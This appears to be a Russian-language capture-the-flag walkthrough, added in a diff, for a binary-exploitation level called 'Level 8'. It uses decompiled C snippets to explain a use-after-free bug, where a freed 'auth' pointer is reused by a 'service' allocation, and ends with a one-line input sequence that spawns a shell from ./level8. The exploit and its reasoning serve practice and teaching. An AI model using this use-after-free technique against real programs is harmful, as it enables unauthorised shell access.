@@ -1,0 +1,31 @@
+# Level 8 - переполнение в куче #2
+
+### 1. Исследуем бинарь и понимаем, чтобы вызвать шелл, нужно выполнить простое условие: память (auth + 8) должна быть не нулем. В данном задании эксплуатируется уязвимость **use after free**
+```c
+    if ( *(auth + 8) )
+        system("/bin/sh");
+```
+
+### 2. Алоцируем память командой auth
+```c
+    if ( !memcmp(s, "auth ", 5u) )
+    {
+      auth = (char *)malloc(4u);
+      *auth = 0;
+      if ( strlen(v5) <= 30 )
+        strcpy(auth, v5);
+    }
+```
+
+### 3. Фришим командой reset, при этом указатель auth не зануляется
+```c
+    if ( !memcmp(s, "reset", 5u) )
+      free(auth);
+```
+### 4. Аллоцируем на этом месте новый чанк service aaa....aaa (достаточное количество раз, чтобы перезаписать auth + 8)
+```c
+    if ( !memcmp(s, "service", 6u) )
+      service = (int)strdup(v6);
+```
+### 5. Запускаем шелл командой login
+    (echo -e "auth qwd\nreset\nservice oiqwjdoiwqodijoqwijdqiowjdiwqdoqjwoidoqiwjdoijqwodij\nlogin"; cat) | ./level8
